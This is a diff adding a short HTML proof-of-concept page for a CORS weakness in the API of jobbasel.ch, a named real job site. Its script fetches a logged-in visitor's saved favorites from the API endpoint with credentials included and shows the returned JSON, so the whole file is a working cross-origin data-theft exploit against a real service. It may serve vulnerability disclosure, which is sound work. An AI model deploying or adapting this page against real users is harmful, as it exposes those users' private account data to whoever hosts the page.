@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS PoC - jobbasel.ch Favorites</h1>
+  <p>Status: <span id="status">Fetching data...</span></p>
+  <pre id="output">Please wait...</pre>
+
+  <script>
+    fetch("https://api.jobbasel.ch/employee/favorite", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(function(response) {
+      document.getElementById("status").textContent = "Got response! Status: " + response.status;
+      return response.json();
+    })
+    .then(function(data) {
+      document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+    })
+    .catch(function(error) {
+      document.getElementById("status").textContent = "Error!";
+      document.getElementById("output").textContent = error.toString();
+    });
+  </script>
+</body>
+</html>
